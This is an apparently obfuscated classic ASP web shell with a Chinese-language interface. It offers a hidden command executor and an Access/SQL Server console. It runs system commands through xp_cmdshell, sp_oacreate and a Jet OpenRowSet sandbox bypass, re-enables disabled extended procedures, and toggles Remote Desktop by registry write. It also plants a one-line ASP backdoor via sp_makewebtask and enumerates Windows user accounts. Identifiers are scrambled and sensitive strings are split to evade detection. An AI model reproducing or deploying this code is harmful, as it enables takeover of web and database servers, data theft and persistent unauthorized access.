if session("azp")="" then session("azp")="cmd.exe"
bzg"docm","",""
ekf"zxp","hidden","pqy"
ekf"azp","hidden",""
ekf"post","hidden","go"
ekf"bdv","hidden",""
faq"100%"" height=""100%":xlj 4:j"<td>"
faq"1000px"" align=""center"" height=""100%"
xlj 4
rny 70,"CMD &#36335;&#24452;:"
rny 860,ohp("azp1","text",Session("azp"))
rny 70,ohp("wschd","checkbox"" "&wschd&" ""","checked")&"WScript"
dvs 4
jzg
rny"","&#25191;&#34892;&#35821;&#21477;:"
rny"",ohp("bdv1","text",gej(bdv))
rny"",ohp("button^:gtf('docm')","button","&#25191; &#34892;")
If post<>"" Then
pmg
if wschd<>"" then
execute "execute ""rtl=moi.Ex""&jmo&""ec(azp&"""" """"&bdv).stdout.ReadAl"&ktt&"l"""
else
Set fso=axu(jdu(0))
szTempFile=server.mappath("cmd.txt")
execute "moi.R"&nsa&"un azp&"" ""&bdv&"" > ""&szTempFile,0,True"
execute "rtl=Server.HTMLEncode(fso.OpenTe"&ppr&"xtFile(szTempFile,1,False,0).Read"&xub&"All)"
execute "fso.Delet"&ozs&"eFile szTempFile,True"
end if
End If
dvs 4
rny"'% height='100%'colspan='3","<textarea readonly Style='width:998;height:100%;'>"&rtl&"</textarea>"
dvs 4:j"<td width='100%' colspan='3'>"
jji(err)
cqm:cqm
End Function
eyq=647
accessStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source={$dbSource};User Id={$userId};Jet OLEDB:Database Password=""{$passWord}"";"
sHeader = "<h3><font face=webdings>8</font> {$s}</h3><table width=100% border=0 cellpadding=0 cellspacing=0>"
SqlSelect = "<select onchange=""javascript:if(this.form.pht)this.form.pht.value=this.value;else this.form.sql.value=this.value;""><option value=''>SQL Server&#24120;&#29992;&#25805;&#20316;&#21015;&#34920;<option value=""exec mas"&msn&"ter.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControl"&rxt&"Set\Control\Term"&fgo&"inal Server','fDenyTSConnections','REG_DWORD',0"">&#25171;&#24320;3389&#31471;&#21475;<option value=""exec mas"&msn&"ter.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControl"&rxt&"Set\Control\Term"&fgo&"inal Server','fDenyTSConnections','REG_DWORD',1"">&#20851;&#38381;3389&#31471;&#21475;<option value=""EXEC [mas"&msn&"ter].[dbo].[xp_subdirs] 'c:\'"">XP_CMDShell&#35835;&#21462;&#30446;&#24405;<option value=""sp_makewebtask @outputfile='d:\bbs\cd.asp',@charset=gb2312,@query='select ''<%ex"&"e"&"cu"&"te(re"&"qu"&"est(c"&"hr(35)))" & Chr(37) & ">''' "">sp_makewebtask&#20889;&#25991;&#20214;" & _
 "<option value=""select * from [jnc]"">&#26597;&#30475;jnc&#20020;&#26102;&#34920;&#20869;&#23481;<option value=""DROP TABLE [jnc];exec mas"&msn&"ter..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFT"&cug&"WARE\Microsoft\Jet\4.0\Engi"&qkq&"nes','SandBoxMo"&ntc&"de','REG_DWORD',1;select * from op"&dif&"enrowSet('microsoft.jet.oledb.4.0',';database=c:\winnt\syste"&eik&"m32\ias\ias.mdb','select shell(&quot;cmd.exe /c del 8617.tmp&&del jnc.tmp&quot;)');"">xp_regwrite&#20020;&#26102;&#25968;&#25454;&#21024;&#38500;<option value=""DROP TABLE [jnc];declare @o int exec sp_oacr"&gyx&"eate '"&jdu(1)&"',@o out exec sp_oame"&aol&"thod @o,'run',NULL,'cmd /c del 8617.tmp'"">sp_oacr"&gyx&"eate&#20020;&#26102;&#25968;&#25454;&#21024;&#38500;</select> "
koc = Replace(fvn("koc"),"\\","\")
lqo=split("xp_cmdshell,sp_oacr"&gyx&"eate,xp_regwrite",",")
sqldlla=split("xp"&ipt&"log70.dll,odsole70.dll,xpstar.dll,xprepl.dll",",")
sqldllb=split("xp_cmdshell,Ole Automation Procedures,Ad Hoc Distributed Queries",",")
if zlc="" then zlc="127.0.0.1"
if miv="" then miv="1433"
if gez="" then gez="s"&"a"
if kmt="" then kmt="Pa"&"ssW"&"ord"
if rxg="" then rxg="systeminfo"
Sub kad()
itm"function iaz(cmd,str){var j=0;var strTmpB;var strTmp=str;strTmpB=frm.zxp.value;if(str&&str.indexOf('*')!= -1){str=str.split('*')[0];strTmp=strTmp.split('*')[1];}if(cmd=='ztw'){if(str=='0'){str=1;}else{frm.reset();}frm.theAct.value = cmd;frm.param.value = str;}frm.submit();frm.target='';frm.zxp.value = strTmpB;frm.reset();}function ogq(column,str){if(!str)return;frm.reset();frm.theAct.value = 'edit';frm.param.value=column+'!'+str;frm.target='_blank';frm.submit();frm.target='';}function gjd(column,str){if(!str)return;if(!confirm('&#30830;&#35748;&#35201;&#21024;&#38500;&#36825;&#26465;&#35760;&#24405;?'))return;frm.reset();frm.theAct.value='del';frm.param.value=column+'!'+str;frm.target='_blank';frm.submit();frm.target='';}function gky(kjb){frm.gsh.value=kjb;iaz('ztw','0');}function kft(xja,oky,pni,lnt,pvd){var iCurrPage;if(pni <= 1){return false;}if(xja>pni){xja=pni;}iCurrPage=Math.ceil(xja/lnt);document.write(""<div align=\""left\"">&nbsp;"");document.write(""&#20849;""+oky+""&#26465;&#35760;&#24405;, ""+pni+""&#39029;&nbsp;"");document.write(""<a href=\""javascript:iaz('ztw','1');\""><font face=\""Webdings\"">9</font></a>"");if(iCurrPage>1){document.write(""<a href=\""javascript:iaz('ztw','"" + ((iCurrPage-2)*lnt+1) + ""');\""><font face=\""Webdings\"">7</font></a>&nbsp;"");}else{document.write(""<font face=\""Webdings\"">7</font>&nbsp;"");}for(var i=(iCurrPage-1)*lnt+1;i<=iCurrPage*lnt;i++){if(i>pni){break;}document.write(""<a href=\""javascript:iaz('ztw','""+i+""');\"">"");if(i==xja){document.write(""<strong>"" + i + ""</strong>"");}else{document.write(i);}document.write(""</a>&nbsp;"");}if(iCurrPage<Math.ceil(pni/lnt)){document.write(""<a href=\""javascript:iaz('ztw','""+(iCurrPage*lnt+1)+""');\""><font face=\""Webdings\"">8</font></a>"");}else{document.write(""<font face=\""Webdings\"">8</font>"");}document.write(""<a href=\""javascript:iaz('ztw','""+pni+""');\""><font face=\""Webdings\"">:</font></a>"");if(Math.ceil(pni/lnt)>=2){document.write(""&nbsp;<input id=\""page\"" value=\""""+xja+""\"" style=\""width:24px;text-align:center;\"" /><input type=\""button\"" value=\""GO\"" onclick=\""javascript:iaz('ztw',document.getElementById('page').value);\"" />"");}document.write(""&nbsp;</div>"");}"
bzg"frm",ghq,""
If theAct <> "" And theAct <> "ztw" And theAct <> "qpr" Then
bbb()
jzg
Response.End()
End If
gst()
Select Case theAct
Case "ztw"
tlx()
Case "qpr"
qpr()
End Select
jzg
End Sub
Sub gst()
dim kns,qym
kns=iif(koc="sql:s" or koc="","block","none")
qym=iif(kns="block","none","block")
ekf"zxp","hidden","kad"
ekf"theAct","hidden",""
ekf"param","hidden",""
j Replace(sHeader,"{$s}","Access + SQL Server &#25968;&#25454;&#24211;&#25805;&#20316;")
j"<td height=50 align=center>"
faq"700"
xlj 0
j"<td width=90><select onchange=""javascript:if(this.value=='sql:s'){s0.style.display='block';s1.style.display='none';}else{s0.style.display='none';s1.style.display='block';}this.form.koc.value=this.value;""><option value='sql:s'>SQL Server<option value='DataSource;frv;PassWord;'>MDB<option value='sql:Dsn=DsnName;'>&#25968;&#25454;&#28304;"
if koc="" then koc="sql:s"
j"</select></td><td id='s1' width='550' style='display:"&qym&";'>"
ekf"koc","text",gej(koc)
j"</td><td id='s0' width='550' style='display:"&kns&";'>Ip:"
ekf"zlc","text|95",gej(zlc):j" Port:"
ekf"miv","text|40",gej(miv):j" Uid:"
ekf"gez","text|80",gej(gez):j" Pwd:"
ekf"kmt","text|80",gej(kmt):j" DataBase:"
ekf"sqdb","text|70",gej(sqdb)
j"</td>"
rny"c",ohp("Submit^:this.form.theAct.value='qpr'","submit","&#25552; &#20132;")
cqm:j"</td>"
cqm
End Sub
Sub qpr()
Dim izq,dox,ess,tco,qkp
On Error Resume Next
xuq()
Set Cat = axu(jdu(13))
Cat.ActiveConnection = xnr.ConnectionString
oob
if vnm then oia:eyq=474
dvs 3
rny"","SQL &#35821;&#21477;&#65306;"
rny"",SqlSelect&"<textarea id=sql name=sql rows=1 style='width:"&eyq&"px;'></textarea> <input type=""button"" value=""&#26597; &#35810;"" onclick=""javascript:this.form.theAct.value='tlx';iaz('ztw','0');"">"&nik("sql")
cqm
j Replace(sHeader,"{$s}","&#25968;&#25454;&#34920;&#21450;&#32467;&#26500;&#26597;&#30475;")
xlj 2:j"<td width='20%' valign=top>"
oob
ess = IIf(vnm = True,"4","6")
Set Rs=xnr.OpenSchema(20)
xlj 3:rny"",b("&#24211;: "&rs(0))
rs.movefirst
do while not rs.eof
if rs(3)="TABLE" then
dvs 0:rny"","<span class=fixSpan title='"&rs(2)&"' onclick=""javascript:iaz('ztw',this.title);this.disabled=true;"" style='width:94%;padding-left:8px;cursor:hand;'>&#34920;: "&rs(2)&"</span>"
qkp=qkp&"<table width=100% align=center>"&pqm(3)&plj("'% colspan='"&ess,"&nbsp;"&b(Rs(2)))&pqm(3)&plj("","&nbsp;&#21015;&#21517;")&plj("100c","&#31867;&#22411;")&plj("90c","&#22823;&#23567;")&plj("90c","&#21487;&#21542;&#20026;&#31354;")
If vnm = False Then
qkp=qkp&plj("60c","&#40664;&#35748;&#20540;")
qkp=qkp&plj("400c","&#25551;&#36848;")
End If
Set rs1=xnr.execute("select * from "&rs(2))
ouc=rs(2)
for each dox in rs1.fields
qkp=qkp&znv(4)&plj("m","&nbsp;"&dox.Name&plj("m",wnc(dox.Type)))
If dox.DefinedSize <> 0 Then
qkp=qkp&plj("c",dox.DefinedSize)
 Else
qkp=qkp&plj("c",IIf(dox.Precision <> 0,dox.Precision,"&nbsp;"))
End If
qkp=qkp&plj("c",IIf(dox.Attributes = 1,"False","True"))
If vnm = False Then
qkp=qkp&plj("c","<span class=fixSpan style='width:40px;padding-left:5px;' title=""" & gej(cat.Tables(ouc).Columns(dox.Name).Properties("Default").value) & """>"& gej(cat.Tables(ouc).Columns(dox.Name).Properties("Default").value)&"</span>")
qkp=qkp&plj("","<span class=fixSpan style='width:95px;padding-left:5px;' title=""" & gej(cat.Tables(ouc).Columns(dox.Name).Properties("Description")) & """>"&gej(cat.Tables(ouc).Columns(dox.Name).Properties("Description"))&"</span>")
End If
next
end if
rs.movenext
loop
cqm
j"</td><td>"
j qkp
j"</td>":cqm
Set rs1 = Nothing
Set rs = Nothing
vmz()
End Sub
Sub tlx()
Dim i,p,x,rs,sql,pht,sqlC,Cat,rok,izq,pag,cof,gbd,ols
On Error Resume Next
sql = fvn("sql")
pag = fvn("param")
cof = fvn("theTable")
Set rs = axu(jdu(15))
If IsNumeric(pag) = True Then
rok = pag
 Else
rok = 1
cof = pag
sql = ""
End If
If sql = "" Then
sql = "Select * From [" & cof & "]"
End If
For i = 1 To request("KeyWord").Count
If request("KeyWord")(i) <> "" Then
sqlC = Replace(request("KeyWord")(i),"'","''")
sqlC = IIf(request("JoinTag")(i) = " like ","'" & sqlC & "'",sqlC)
pht = pht & "[" & request("Fields")(i) & "]" & request("JoinTag")(i) & sqlC & request("JoinTag2")(i)
End If
Next
If pht <> "" Then
sql = "Select * From [" & cof & "] Where " & pht
If Right(sql,4) = " Or " Then sql = Left(sql,Len(sql) - 4)
If Right(sql,5) = " And " Then sql = Left(sql,Len(sql) - 5)
End If
if gsh<>"" then sql=""
xuq()
oob
if vnm then oia:eyq=474
dvs 3
rny"","SQL &#35821;&#21477;&#65306;"
rny"",SqlSelect&ohp("sql","hidden",gej(sql))&"<textarea name=pht id=pht rows=1 style='width:"&eyq&"px;'>" & gej(sql) & "</textarea> "&ohp("^:this.form.boq.value='';this.form.sql.value=this.form.pht.value;iaz('ztw','0')","button","&#26597; &#35810;")&nik("pht")&ohp("theTable","hidden",gej(cof))
cqm
If LCase(Left(sql,7)) = "select " and gsh="" Then
j Replace(sHeader,"{$s}","&#25968;&#25454;&#26597;&#35810;&#22120;")
Set Rs1=xnr.OpenSchema(20)
xlj 2:j"<td width='20%' valign=top>"
oob
rs1.movefirst
do while not rs1.eof
if rs1(3)="TABLE" then 
If rs1(2)=cof  Then
dvs 2
Else
dvs 0
End If
rny"","<span class=fixSpan title='" & rs1(2) & "' onclick=""javascript:iaz('ztw',this.title);this.disabled=true;"" style='width:94%;padding-left:8px;cursor:hand;'>"&rs1(2)&"</span>"
end if
rs1.movenext
loop
set rs1=nothing
cqm
j"</td><td valign=top>"
rs.Open sql,xnr,1,1
jji(Err)
rs.PageSize = 20
If Not rs.Eof Then
rs.AbsolutePage = rok
End If
j"<div align=left>"
oob
xlj 3
rny"","&nbsp;&#26597;&#35810;"
j"</tr><tr><td align=center>"
j"<div><br><select name=Fields>"
For Each x In rs.Fields
j"<option value=""" & x.Name & """>" & x.Name & "</option>"
Next
j"</select>"
j"<select name=JoinTag><option value=' like '>like</option><option value='='>=</option></select>"
ekf"KeyWord","text|200",""
j"<select name=JoinTag2><option value=' And '>And</option><option value=' Or '>Or</option></select> "
ekf"^:this.parentElement.outerHTML+='<div>'+this.parentElement.innerHTML+'</div>'","button","+"
ekf"^:this.parentElement.outerHTML=''","button","-":j"</div>"
ekf"^:this.form.sql.value='';this.form.param.value='1';this.form.theAct.value='ztw';this.form.submit()","button","&#26597;&#35810;"
j"<br><br></div>":cqm
If rs.Fields.Count > 0 Then
gbd = ogc(cof)
j"<table width='99%'>"
dvs 3
rny"100' height='22c","&#25805;&#20316;"
For p = 0 To rs.Fields.Count - 1
rny 1/rs.Fields.Count*100&"%","<span class=fixSpan title='" & rs.Fields(p).Name & "' style='width:125px;padding-left:5px;'>" & rs.Fields(p).Name & "</span>"
Next
For i = 1 To rs.PageSize
If rs.Eof Then Exit For
dvs 1
j"<td width=100 height=22 align=center>"
If gbd <> "" Then
ekf"^:ogq('" & gbd & "','" & rs(gbd) & "')","button","&#32534;&#36753;"
ekf"^:gjd('" & gbd & "','" & rs(gbd) & "')","button","&#21024;&#38500;"
 Else
ekf"^:alert('&#20027;&#38190;&#19981;&#23384;&#22312;,&#25805;&#20316;&#26377;&#21487;&#33021;&#23548;&#33268;&#37325;&#22823;&#25968;&#25454;&#24211;&#28798;&#38590;,&#24182;&#19988;&#35813;&#25805;&#20316;&#19981;&#21487;&#36870;!');ogq('" &rs.Fields(0).Name& "','" &rs(rs.Fields(0).Name)& "')","button","&#32534;&#36753;"
ekf"^:alert('&#20027;&#38190;&#19981;&#23384;&#22312;,&#25805;&#20316;&#26377;&#21487;&#33021;&#23548;&#33268;&#37325;&#22823;&#25968;&#25454;&#24211;&#28798;&#38590;,&#24182;&#19988;&#35813;&#25805;&#20316;&#19981;&#21487;&#36870;!');gjd('" &rs.Fields(0).Name& "','" &rs(rs.Fields(0).Name)& "')","button","&#21024;&#38500;"
End If
For p = 0 To rs.Fields.Count - 1
rny"","<span class=fixSpan style='width:125px;padding-left:5px;'>" & gej(IIf(Len(rs(p)) > 50,Left(rs(p),50),rs(p))) & "</span>"
Next
rs.MoveNext
Next
End If
dvs 3
itm"kft(" & rok & ",'" & rs.RecordCount & "','" & rs.PageCount & "',10,'');"
cqm
rs.Close
 else
 if fvn("boq")<>"" and gsh="gsh" then
select case boq
case 0
sql="Exec mas"&msn&"ter.dbo.XP_CMDShell '"&rxg&"'"
case 1
xnr.Execute("create table [jnc](resulttxt nvarchar(1024) null);use mas"&msn&"ter declare @o int exec sp_oacr"&gyx&"eate 'WSc"&puf&"ript.Sh"&off&"ell',@o out exec sp_oame"&aol&"thod @o,'run',null,'cmd /c "&rxg&" > 8617.tmp',0,true;bulk insert [jnc] from '8617.tmp' with (keepnulls);")
sql="select * from jnc"
sqloff="drop table [jnc];declare @o int exec sp_oacr"&gyx&"eate 'WSc"&puf&"ript.Sh"&off&"ell',@o out exec sp_oame"&aol&"thod @o,'run',null,'cmd /c del 8617.tmp'"
case 2
path="c:\windows\syste"&eik&"m32\ias\ias.mdb"
xnr.Execute("create table [jnc](resulttxt nvarchar(1024) null);exec mas"&msn&"ter..xp_regwrite 'hkey_local_machine','SOFT"&cug&"WARE\microsoft\jet\4.0\Engi"&qkq&"nes','SandBoxMo"&ntc&"de','reg_dword',0;select * from op"&dif&"enrowSet('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c "&rxg&" > 8617.tmp"&chr(34)&")');")
xnr.execute("select * from op"&dif&"enrowSet('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c copy 8617.tmp jnc.tmp"&chr(34)&")');bulk insert [jnc] from 'jnc.tmp' with (keepnulls);")
sql="select * from jnc"
sqloff="drop table [jnc];exec mas"&msn&"ter..xp_regwrite 'hkey_local_machine','SOFT"&cug&"WARE\microsoft\jet\4.0\Engi"&qkq&"nes','SandBoxMo"&ntc&"de','reg_dword',1;select * from op"&dif&"enrowSet('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c del 8617.tmp&&del jnc.tmp"&chr(34)&")');"
case ""
exit sub
case else
end select
end if
jji(Err)
oob
xlj 3
rny"","&#25191;&#34892;&#32467;&#26524;&#65306;":j"</tr>"
if gsh="nww" or gsh="rrt" then
i=0
if gsh="rrt" then xnr.Execute("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'Web Assistant Procedures', 1;RECONFIGURE;")
for each x in lqo
if gsh="rrt" then xnr.Execute("dbcc adde"&pvp&"xtEndedproc ('"&x&"','"&sqldlla(i)&"');EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure '"&sqldllb(i)&"', 1;RECONFIGURE;")
Set rs=xnr.Execute("select count(*) from mas"&msn&"ter.dbo.sysobjects where xtype='x' and name='"&x&"'")
ols=ols&znv(1)&plj("",iif(gsh="rrt","&#24674;&#22797;......","")&x&"......"&iif(rs(0)<>"",kyj,ttg))
set rs=nothing
i=i+1
next
else
Set rs = xnr.Execute(sql,i,&H0001)
jji(Err)
If rs.Fields.Count > 0 Then
xlj 4
For i = 0 To rs.Fields.Count - 1
rny"",rs.Fields(i).Name
ols = ols &plj("","{$" & i & "}")
Next
ols = ols & "</tr>"
j"</tr>"
Do Until rs.EOF
For i = 0 To rs.Fields.Count - 1
ols = Replace(ols,"{$" & i & "}",ups(rs(i)) & "<br />{$" & i & "}")
Next
rs.MoveNext
Loop
For i = 0 To rs.Fields.Count - 1
ols = Replace(ols,"<br />{$" & i & "}","")
Next
Else
ols=plj("","&#26597;&#35810;&#25191;&#34892;&#25104;&#21151;")
End If
end if
j ols 
cqm
xnr.execute(sqloff)
Set rs = Nothing
Set Cat = Nothing
vmz()
Exit Sub
End If
j"</td>":cqm
Set rs = Nothing
Set Cat = Nothing
vmz()
End Sub
Sub bbb()
Dim wls,gai,xdy,zxc,pip,tuf,rux,por
Dim i,x,rs,sql,cof,vgb,pag,rmc,thr,iiv,gbd
On Error Resume Next
sql = fvn("sql")
pag = fvn("param")
cof = fvn("theTable")
rmc = InStr(pag,"!")
wls = InStr(LCase(sql)," where")
gai = InStrRev(LCase(sql),"order ")
xdy = IIf(LCase(Right(sql,4)) = "desc","1","0")
iiv = Mid(pag,rmc + 1)
thr = Left(pag,rmc - 1)
vgb = IIf(theAct = "next",">",IIf(theAct = "pre","<",""))
If gai > 0 Then sql = Left(sql,gai - 1)
If wls > 0 Then
tuf = ") And "
sql = Left(sql,wls + 5) & "(" & Mid(sql,wls + 6)
 Else
tuf = " Where "
End If
If xdy > 0 Then vgb = IIf(vgb = ">","<",IIf(vgb = "<",">",""))
xuq()
gbd = ogc(cof)
Set rs = axu(jdu(15))
If vgb <> "" And IsNumeric(iiv) = True Then
sql = "Select Top 1" & Mid(sql,7) & tuf
sql = sql & thr & " " & vgb & " " & iiv & " Order By " & thr & IIf(vgb = "<"," Desc"," Asc")
 Else
sql = sql & tuf & thr & " like '" & Replace(iiv,"'","''") & "'"
End If
pip = InStr(LCase(sql),"from")
wls = InStr(LCase(sql)," where")
zxc = InStr(pip,LCase(sql),",",1)
If zxc > 0 Then
If (zxc > pip) And (zxc < wls) Then
rux = True
End If
End If
If theAct = "dbdownfile" Then
por = Split(pag,"!")
iiv = Replace(por(1) & "!" & por(2),"'","''")
sql = Replace(sql,iiv,Replace(por(1),"'","''"))
Set rs = xnr.Execute(sql)
DBDownTheFile(rs(por(2)))
Set rs = Nothing
Response.End()
End If
If theAct <> "edit" Then
rs.Open sql,xnr,1,3
jji(Err)
If rs.Eof Then
itm"alert('&#35813;&#35760;&#24405;&#19981;&#23384;&#22312;!');history.back();"
Response.End()
End If
If theAct = "new" Then rs.AddNew
If theAct = "del" Then
rs.Delete
rs.Update
xlv("&#21024;&#38500;&#25104;&#21151;!")
Response.End
 Else
If theAct <> "pre" And theAct <> "next" Then
For Each x In rs.Fields
If gbd <> x.Name Then
rs(x.Name) = fvn(x.Name & "_Column")
End If
Next
rs.Update
End If
iiv = rs(thr)
End If
If theAct = "new" Then
sql = "Select * From [" & cof & "] Where " & thr & " like '" & Replace(iiv,"'","''") & "'"
End If
rs.Close
End If
rs.Open sql,xnr,1,1
j"<table width=600 align=center>"
xlj 4
wvy"&#25968;&#25454;&#32534;&#36753;"
ekf"zxp","hidden","kad"
ekf"theAct","hidden","save"
ekf"sql","hidden",gej(fvn("sql"))
ekf"theTable","hidden",cof
ekf"param","hidden",gej(thr & "!" & iiv)
ekf"koc","hidden",gej(fvn("koc"))
For Each x In rs.Fields
dvs 4
j"<td height=22 width=150>&nbsp;" & gej(x.Name) & "<br/>&nbsp;(<em>" & wnc(x.Type) & "</em>)"
If x.Type = 204 Or x.Type = 205 Then ekf"^:iaz('dbdownfile','" & x.Name & "')","button","&#19979;&#36733;"
j"</td>"
j"<td width=450>&nbsp;"
j"<textarea style='width:436;' name=""" & x.Name & "_Column""" & IIf(x.Type = 201 Or x.Type = 203," rows=6","")
j IIf(x.Properties("ISAUTOINCREMENT").Value," disabled","") 
j IIf(x.Name = gbd," title='&#20027;&#38190;,&#30001;&#20110;&#20027;&#38190;&#32422;&#26463;,&#23558;&#26080;&#27861;&#34987;&#20462;&#25913;,&#20063;&#19981;&#33021;&#20986;&#29616;&#30456;&#21516;&#20540;.'","") & ">"
j gej(x.value)
j"</textarea></td></tr>"
Next
j"<tr>"
j"<td colspan=2 class=td align=center>"
If rux = False Then
If gbd = "" Then
ekf"^:if(confirm('&#30830;&#23450;&#35201;&#20462;&#25913;&#36825;&#26465;&#35760;&#24405;&#21527;?\n&#27492;&#34920;&#27809;&#26377;&#20027;&#38190;,&#32487;&#32493;&#25805;&#20316;&#21487;&#33021;&#20250;&#23548;&#33268;&#25968;&#25454;&#24211;&#28798;&#38590;,&#24182;&#19988;&#35813;&#38169;&#35823;&#26080;&#27861;&#34987;&#25764;&#28040;.')){this.form.theAct.value='save';this.form.submit();}","button","&#20462;&#25913;"
 Else
ekf"^:this.form.theAct.value='save'","submit","&#20462;&#25913;"
ekf"^:if(confirm('&#30830;&#23454;&#35201;&#28155;&#21152;&#24403;&#21069;&#20026;&#26032;&#35760;&#24405;&#21527;?')){this.form.theAct.value='new';this.form.submit();}","button","&#28155;&#21152;"
ekf"^:if(confirm('&#30830;&#23454;&#21024;&#38500;&#24403;&#21069;&#35760;&#24405;&#21527;?')){this.form.theAct.value='del';this.form.submit();}","button","&#21024;&#38500;"
End If
 Else
j"<input type=button value=&#26242;&#19981;&#25903;&#25345;&#22810;&#34920;&#25805;&#20316; disabled>"
End If
ekf"","reset","&#37325;&#32622;"
ekf"^:window.close()","button","&#20851;&#38381;"
j"<input type=reset value=&#37325;&#32622;><input type=button value=&#20851;&#38381; onclick='javascript:window.close();'>"
If IsNumeric(iiv) = True Then
ekf"^:this.form.theAct.value='pre';this.form.submit()","button","&#19978;&#19968;&#26465;"
ekf"^:this.form.theAct.value='next';this.form.submit()","button","&#19979;&#19968;&#26465;"
End If
j"</td>"
j"</tr>"
j"</table>"
rs.Close
Set rs = Nothing
vmz()
End Sub
sub oia()
set rs=xnr.execute("select is_srvrolemember('sysadmin')")
if rs(0)=0 then amm="&#19981;"
set rs=nothing
ekf"gsh","hidden",""
xlj 3
rny 60,"&#32452;&#20214;&#25805;&#20316;&#65306;":j"<td>"
ekf"nww^:gky('nww')","button","&#26816;&#27979;&#32452;&#20214;":j" "
ekf"rrt^:gky('rrt')","button","&#24674;&#22797;&#32452;&#20214;":j" "&piq("&#27492;&#36134;&#21495;"&amm&"&#26159;&#26368;&#39640;&#26435;&#38480;,SQL Server 2005 &#32452;&#20214;&#40664;&#35748;&#20026;&#31105;&#29992;&#65292;&#35831;&#28857;&#20987;&#24674;&#22797;&#32452;&#20214;&#21518;&#20877;&#25191;&#34892;&#30456;&#20851;&#21629;&#20196;")&"</td>"
dvs 3
rny"","CMD &#21629;&#20196;&#65306;":j"<td>"
j"<select name='boq' id='boq'><option value=''>&#36873;&#25321;&#25191;&#34892;&#32452;&#20214;"
for i=0 to 2
j"<option value='"&i&"'"
if trim(i)=boq then j" selected='selected'"
j">"&lqo(i)&"</option>"
next
j"</select> "
ekf"rxg","text"" size=""102",rxg:j" "
ekf"^:gky('gsh')","button","&#25191; &#34892;":j"</td>"
end sub
Sub xuq()
Dim eam,sgn,frv,passWord,wki
On Error Resume Next
Set xnr = axu(jdu(12))
if koc="sql:s" then
koc="sql:Driver={Sql Server};Server={$zlc};Database={$sqdb};Uid={$gez};Pwd={$kmt}"
if IsNumeric(miv) then miv=","&miv else miv=",1433"
koc = Replace(koc,"{$zlc}",zlc&miv)
koc = Replace(koc,"{$gez}",gez)
koc = Replace(koc,"{$kmt}",kmt)
koc = Replace(koc,"{$sqdb}",sqdb)
end if
If LCase(Left(koc,4)) = "sql:" Then
eam = Mid(koc,5)
vnm = True
 Else
sgn = Split(koc,";")
wki = sgn(0)
wki = wki
jji(Err)
If UBound(sgn) >= 2 Then
frv = sgn(1)
passWord = sgn(2)
End If
eam = Replace(accessStr,"{$dbSource}",wki)
eam = Replace(eam,"{$userId}",frv)
eam = Replace(eam,"{$passWord}",passWord)
end if
xnr.Open eam
jji(Err)
End Sub
Function ogc(cof)
Dim cur
On Error Resume Next
Set cur = xnr.OpenSchema(28,Array(Empty,Empty,cof))
If Not cur.Eof Then ogc = cur("COLUMN_NAME")
Set cur = Nothing
End Function
Function wnc(flag)
Dim str
Select Case flag
Case 0 : str = "EMPTY"
Case 2 : str = "SMALLINT"
Case 3 : str = "INTEGER"
Case 4 : str = "SINGLE"
Case 5 : str = "DOUBLE"
Case 6 : str = "CURRENCY"
Case 7 : str = "DATE"
Case 8 : str = "BSTR"
Case 9 : str = "IDISPATCH"
Case 10 : str = "ERROR"
Case 11 : str = "BIT"
Case 12 : str = "VARIANT"
Case 13 : str = "IUNKNOWN"
Case 14 : str = "DECIMAL"
Case 16 : str = "TINYINT"
Case 17 : str = "UNSIGNEDTINYINT"
Case 18 : str = "UNSIGNEDSMALLINT"
Case 19 : str = "UNSIGNEDINT"
Case 20 : str = "BIGINT"
Case 21 : str = "UNSIGNEDBIGINT"
Case 72 : str = "GUID"
Case 128 : str = "BINARY"
Case 129 : str = "CHAR"
Case 130 : str = "WCHAR"
Case 131 : str = "NUMERIC"
Case 132 : str = "USERDEFINED"
Case 133 : str = "DBDATE"
Case 134 : str = "DBTIME"
Case 135 : str = "DBTIMESTAMP"
Case 136 : str = "CHAPTER"
Case 200 : str = "VARCHAR"
Case 201 : str = "LONGVARCHAR"
Case 202 : str = "VARWCHAR"
Case 203 : str = "LONGVARWCHAR"
Case 204 : str = "VARBINARY"
Case 205 : str = "LONGVARBINARY"
Case Else : str = flag
End Select
wnc = str
End Function
Sub xlv(str)
If str = "" Then
j"<script language=javascript>window.close();</script>"
 Else
j"<script language=javascript>alert(""" & str & """);window.close();</script>"
End If
End Sub
Function ups(str)
str = gej(str)
str = Replace(str," ","&nbsp;")
str = Replace(str,"","&nbsp;&nbsp;&nbsp;&nbsp;")
str = Replace(str,vbNewLine,"<br />")
ups = str
End Function
Function ubv(rpath)
Dim jfd,jfr
On Error Resume Next
pmg
execute "jfd=moi.Re"&sww&"gRead(rpath)"
If IsArray(jfd)Then
jfr=""
For i=0 To UBound(jfd)
If IsNumeric(jfd(i))Then
If CInt(jfd(i))<16 Then
jfr=jfr&"0"
End If
jfr=jfr&CStr(Hex(CInt(jfd(i))))
Else
jfr=jfr&jfd(i)
End If
Next
ubv=jfr
Else
ubv=jfd
End If
if err then ubv=piq(err.Description)
End Function
Sub aiy(syh)
Dim User,ujf,irb
On Error Resume Next
Set User=getObject("WinNT://./"&syh&",user")
ujf=User.Get("UserFlags")
irb=User.LastLogin
rny 200,"<b>"&user.Name&"</b>":rny 50,"&#38582;&#23646;&#20110;&#65306;":rny"",glj(syh):rny 60,"&#26368;&#21518;&#30331;&#24405;&#65306;":rny 140,irb
cqm
faq"100%"" id=""usertr_"&i&""" style=""display:none;"
xlj 0
rny 150,"&#23494;&#30721;&#24050;&#36807;&#26399;"
rny"",CBool(User.Get("PasswordExp"&gpa&"ired"))
dvs 1
rny"","&#23494;&#30721;&#27704;&#19981;&#36807;&#26399;"
rny"",cbool(ujf And&H10000)
dvs 0
rny"","&#29992;&#25143;&#19981;&#33021;&#26356;&#25913;&#23494;&#30721;"
rny"",cbool(ujf And&H00040)
dvs 1
rny"","&#20840;&#23616;&#36134;&#25143;"
rny"",cbool(ujf And&H100)
dvs 0
rny"","&#23494;&#30721;&#26368;&#23567;&#38271;&#24230;"
rny"",User.PasswordMinimumLength
dvs 1
rny"","&#26159;&#21542;&#24517;&#39035;&#23494;&#30721;"
